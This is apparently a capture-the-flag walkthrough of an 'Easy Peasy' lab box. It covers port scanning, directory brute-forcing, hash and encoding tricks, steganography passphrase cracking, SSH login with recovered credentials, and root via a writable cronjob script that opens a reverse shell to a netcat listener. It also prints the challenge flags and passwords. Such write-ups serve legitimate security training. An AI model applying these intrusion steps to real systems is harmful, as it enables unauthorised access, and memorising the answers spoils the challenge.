




>**How many ports are open?**

```
$ nmap -p- 10.66.151.254 
Nmap scan report for 10.66.151.254
Host is up (0.44s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
6498/tcp  open  unknown
65524/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1682.32 seconds

```

>**What is the version of nginx?**

```
$ nmap -p80 -sV 10.66.151.254                                  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-07 18:24 +0530
Nmap scan report for 10.66.151.254
Host is up (0.46s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.16.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.00 seconds

```

>What is running on the highest port?

```
$ nmap -p65524  -A 10.66.151.254                            
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-07 18:25 +0530
Nmap scan report for 10.66.151.254
Host is up (0.73s latency).

PORT      STATE SERVICE VERSION
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.43 (Ubuntu)
|_http-title: Apache2 Debian Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone
Running (JUST GUESSING): Linux 5.X|6.X|4.X (96%), Google Android 10.X|11.X|12.X (93%)
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:6 cpe:/o:linux:linux_kernel:4 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/o:linux:linux_kernel:5.4
Aggressive OS guesses: Linux 5.14 - 6.8 (96%), Linux 4.15 - 5.19 (96%), Linux 4.15 (96%), Linux 5.4 - 5.15 (96%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 10 - 11 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Android 9 - 11 (Linux 4.9 - 4.14) (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops

TRACEROUTE (using port 65524/tcp)
HOP RTT       ADDRESS
1   371.42 ms 192.168.192.1
2   ...
3   680.40 ms 10.66.151.254

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.39 seconds

```

>**Using GoBuster, find flag 1**

Directory scan for main URL 

```
$ gobuster dir  -u http://10.66.151.254/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.66.151.254/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
hidden               (Status: 301) [Size: 169] [--> http://10.66.151.254/hidden/]
index.html           (Status: 200) [Size: 612]
robots.txt           (Status: 200) [Size: 43]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

I founded hidden directory of main URL

Second, I scan directory in hidden directory 

```
$ gobuster dir  -u http://10.66.151.254/hidden/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.66.151.254/hidden/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 390]
whatever             (Status: 301) [Size: 169] [--> http://10.66.151.254/hidden/whatever/]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================

```

Founded as whatever directory & opened on browser it.Enumerate the page source code

```
|   |
|---|
|<!DOCTYPE html>|
|<html>|
|<head>|
|<title>dead end</title>|
|<style>|
|body {|
|background-image: url("https://cdn.pixabay.com/photo/2015/05/18/23/53/norway-772991_960_720.jpg");|
|background-repeat: no-repeat;|
|background-size: cover;|
|width: 35em;|
|margin: 0 auto;|
|font-family: Tahoma, Verdana, Arial, sans-serif;|
|}|
|</style>|
|</head>|
|<body>|
|<center>|
|<p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p>|
|</center>|
|</body>|
|</html>|
||
```

I am looked at base64 encryption 

After that I am decrypt it and take flag 1 

```
$ echo -n "ZmxhZ3tmMXJzN19mbDRnfQ==" | base64 -d
flag{f1rs7_fl4g} 
```

>**Further enumerate the machine, what is flag 2?**

```
$ dirsearch -u http://10.66.151.254:65524/

  _|. _ _  _  _  _ _|_    v0.4.4                                                                                                                                      
 (_||| _) (/_(_|| (_| )                                                                                                                                               
                                                                                                                                                                      
Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12295

Target: http://10.66.151.254:65524/

[18:48:32] Scanning:                                                                                                                                                  
[18:53:53] 200 -   11KB - /index.html                                        
[18:54:51] 200 -   153B - /robots.txt                                        
[18:54:54] 403 -   281B - /server-status/                                    
[18:54:54] 403 -   281B - /server-status                                     
                                                                              
Task Completed   
```

Open /robots.txt file and I founded md5 hash value 

```
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```

Using https://md5.gromweb.com decrypt it

```
flag{1m_s3c0nd_fl4g}
```

>**Crack the hash with easypeasy.txt, What is the flag 3?**

Enumerate the apache default page and find it

```
- They are activated by symlinking available configuration files from their respective Fl4g 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312} *-available/ counterparts. These should be managed by using our helpers a2enmod, a2dismod, a2ensite, a2dissite, and a2enconf, a2disconf . See their respective man pages for detailed information.
```

>**What is the hidden directory?**

Enumerate the that source code & decrypt it using  https://www.dcode.fr/base62-encoding 

```
/n0th1ng3ls3m4tt3r
```

>**Using the wordlist that provided to you in this task crack the hash**  
   **what is the password?**

I am opened the enumerate directory and saw a image and download it
I was try to get information about embedded data

```
$ steghide info binarycodepixabay.jpg
"binarycodepixabay.jpg":
  format: jpeg
  capacity: 4.6 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: could not extract any data with that passphrase!

```

But not access because haven't passphrase 

after crack the passphrase 

```
stegcracker binarycodepixabay.jpg easypeasy_1596838725703.txt 
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2026 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which 
will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

Counting lines in wordlist..
Attacking file 'binarycodepixabay.jpg' with wordlist 'easypeasy_1596838725703.txt'..
Successfully cracked file with password: mypasswordforthatjob
Tried 3649 passwords
Your file has been written to: binarycodepixabay.jpg.out
mypasswordforthatjob

```

successfully get information about embedded data

```
$ steghide info binarycodepixabay.jpg
"binarycodepixabay.jpg":
  format: jpeg
  capacity: 4.6 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "secrettext.txt":
    size: 278.0 Byte
    encrypted: no
    compressed: no

```

Extract it 

```
$ steghide --extract -sf binarycodepixabay.jpg 
Enter passphrase: 
wrote extracted data to "secrettext.txt".
```

Cat the  secrettext.txt file

```
$ cat secrettext.txt
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001

```

>**What is the password to login to the machine via SSH?**


Binary convert  to text 

```
username:boring
password:iconvertedmypasswordtobinary
```

>**What is the user flag?**

```
$ ssh boring@10.67.140.42 -p6498
The authenticity of host '[10.67.140.42]:6498 ([10.67.140.42]:6498)' can't be established.
ED25519 key fingerprint is: SHA256:6XHUSqR7Smm/Z9qPOQEMkXuhmxFm+McHTLbLqKoNL/Q
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.67.140.42]:6498' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
*************************************************************************
**        This connection are monitored by government offical          **
**            Please disconnect if you are not authorized              **
** A lawsuit will be filed against you if the law is not followed      **
*************************************************************************
boring@10.67.140.42's password: 
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
boring@kral4-PC:~$ ls
user.txt
boring@kral4-PC:~$ cat user.txt
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}

```

Founded the real flag using https://rot13.com

```
flag{n0wits33msn0rm4l}

```

>**What is the root flag?**

```
boring@kral4-PC:/$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh

```

Include to the cronjob revers shell

```
boring@kral4-PC:/$ cd /var/www/ && sudo bash .mysecretcronjob.sh
[sudo] password for boring: 

Sorry, try again.
[sudo] password for boring: 
Sorry, try again.
[sudo] password for boring: 
sudo: 3 incorrect password attempts
boring@kral4-PC:/var/www$ ls
html
boring@kral4-PC:/var/www$ ls -al
total 16
drwxr-xr-x  3 root   root   4096 Jun 15  2020 .
drwxr-xr-x 14 root   root   4096 Jun 13  2020 ..
drwxr-xr-x  4 root   root   4096 Jun 15  2020 html
-rwxr-xr-x  1 boring boring   33 Jun 14  2020 .mysecretcronjob.sh
boring@kral4-PC:/var/www$ cat .mysecretcronjob.sh
#!/bin/bash
# i will run as root
boring@kral4-PC:/var/www$ nano 
html/                .mysecretcronjob.sh  
boring@kral4-PC:/var/www$ nano 
html/                .mysecretcronjob.sh  
boring@kral4-PC:/var/www$ nano .
./                   ../                  .mysecretcronjob.sh  
boring@kral4-PC:/var/www$ nano .mysecretcronjob.sh

```

```
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.192.229] from (UNKNOWN) [10.67.140.42] 45548
bash: cannot set terminal process group (1612): Inappropriate ioctl for device
bash: no job control in this shell
root@kral4-PC:/var/www# ls
ls
html
root@kral4-PC:/var/www# cd /root
cd /root
root@kral4-PC:~# ls
ls
root@kral4-PC:~# ls -al
ls -al
total 40
drwx------  5 root root 4096 Jun 15  2020 .
drwxr-xr-x 23 root root 4096 Jun 15  2020 ..
-rw-------  1 root root    2 Nov  7 08:01 .bash_history
-rw-r--r--  1 root root 3136 Jun 15  2020 .bashrc
drwx------  2 root root 4096 Jun 13  2020 .cache
drwx------  3 root root 4096 Jun 13  2020 .gnupg
drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
-rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor
root@kral4-PC:~# cat .root.txt
cat .root.txt
flag{63a9f0ea7bb98050796b649e85481845}

```
